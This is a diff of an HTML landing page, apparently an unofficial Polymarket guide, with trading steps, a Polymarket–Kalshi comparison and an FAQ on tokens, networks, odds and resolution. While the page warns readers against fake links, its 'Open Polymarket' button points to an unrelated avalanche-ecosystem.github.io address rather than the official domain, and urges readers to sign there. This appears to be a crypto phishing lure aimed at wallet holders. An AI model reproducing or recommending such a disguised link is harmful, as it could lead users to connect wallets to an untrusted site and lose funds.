+  <section class="section"><div class="container"><h2>How to trade Polymarket</h2><ol class="steps"><li><b>Open the app</b><span>Use the verified official domain, then browse topics such as crypto, sports, politics, tech, and culture.</span></li><li><b>Read the rules</b><span>Open a market, review its title, resolution source, end date, and edge cases before placing any order.</span></li><li><b>Fund and trade</b><span>Use the official deposit flow; the international docs describe pUSD as an <a class="inline-link" href="https://ethereum.org/en/developers/docs/standards/tokens/erc-20/" rel="noopener noreferrer">ERC-20 collateral token</a> on Polygon backed by USDC.</span></li><li><b>Track resolution</b><span>Follow price changes, manage positions, and redeem eligible winning tokens after the market resolves.</span></li></ol><div class="cta-band"><div><p>Ready to trade?</p><p class="sub">Open the official Polymarket app and verify the domain before you sign.</p></div><a class="btn btn-green" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open Polymarket ↗</a></div></div></section>
+  <section class="section"><div class="container"><h2>Polymarket vs Kalshi</h2><div class="cmp-wrap"><table class="cmp-table"><thead><tr><th>Dimension</th><th>Polymarket</th><th>Kalshi</th></tr></thead><tbody><tr><td>Market style</td><td>Crypto-native prediction markets</td><td><a class="inline-link" href="https://www.cftc.gov/PressRoom/PressReleases/8393-22" rel="noopener noreferrer">Regulated event contracts</a></td></tr><tr><td>Funding</td><td>USDC and supported crypto/payment flows</td><td><a class="inline-link" href="https://www.britannica.com/topic/fiat-money" rel="noopener noreferrer">Fiat-style account funding</a></td></tr><tr><td>Typical search demand</td><td>Politics, crypto, sports, global events</td><td>U.S.-regulated event contracts</td></tr><tr><td>Main checks</td><td>Wallet, USDC network, resolution rules</td><td>Eligibility, fees, contract terms</td></tr></tbody></table></div></div></section>
+  <section class="section section-alt" id="faq"><div class="container"><h2>Polymarket FAQ</h2><div class="faq-list"><details open><summary><h3>Does Polymarket have a token?</h3></summary><div>Polymarket does not have a public platform token used for ordinary trading. Markets are generally collateralized with USDC, and users should be cautious about fake Polymarket token claims or airdrop links unless they are confirmed through Polymarket's official site or social channels.</div></details><details><summary><h3>What network does Polymarket use?</h3></summary><div>Polymarket is crypto-native and has used Polygon for market settlement and USDC collateral flows. Users should confirm the network inside the live app before depositing, because sending the wrong USDC version or using the wrong chain can create recovery problems.</div></details><details><summary><h3>How are Polymarket odds calculated?</h3></summary><div>Polymarket odds come from market prices where traders buy and sell outcome shares. A Yes share trading near 60 cents is often read as roughly 60% implied probability, but spreads, liquidity, fees, and market rules mean it is not a pure forecast or guaranteed probability.</div></details><details><summary><h3>Can U.S. users trade on Polymarket?</h3></summary><div>Access depends on Polymarket's current terms, <a class="inline-link" href="https://www.reuters.com/legal/transactional/us-cftc-says-polymarket-agreed-settle-charges-2022-01-03/" rel="noopener noreferrer">jurisdiction rules</a>, and user eligibility checks. Because prediction market rules are regulatory-sensitive and can change, users should rely on the live Polymarket terms and onboarding flow rather than old guides or social posts.</div></details><details><summary><h3>What happens when a Polymarket market resolves?</h3></summary><div>When a market resolves, winning outcome shares become redeemable according to the market's payout rules and losing shares become worthless. The exact process depends on the market, oracle, and app workflow. Users should keep track of market status and claim or redeem when available.</div></details><details><summary><h3>Why is Polymarket price different from polls?</h3></summary><div>Polymarket prices reflect traders risking capital, not a direct poll of public opinion. Prices can react to polling, news, liquidity, hedging demand, and trader positioning. A prediction market can disagree with polls because it incorporates different incentives, assumptions, and information sources.</div></details></div></div></section>
 </main>
 <footer class="site-footer"><div class="container">
-<nav aria-label="Footer" class="footer-nav"><a href="#how-it-works">How it works</a><a href="#access-and-availability">Access &amp; availability</a><a href="#fees-security-resolution">Fees security resolution</a><a href="#core-concepts">Core concepts</a><a href="#market-areas">Market areas</a><a href="#faq">FAQ</a></nav>
-<p class="footer-note">Not the official Polymarket app — verify the domain before connecting a wallet. Information on this page is for educational purposes only and is not financial advice.</p>
-<p class="footer-meta"><a href="#top">Back to top ↑</a></p>
+  <div class="footer-grid"></div>
+  <p class="footer-note">Not the official app; verify polymarket.com or polymarket.us where applicable; educational only, not financial advice.</p>
+  <p class="footer-meta"><a href="#top">Back to top ↑</a></p>
 </div></footer>
-<script defer="" src="static/app.js"></script>
+<script src="static/app.js" defer></script>
 </body></html>
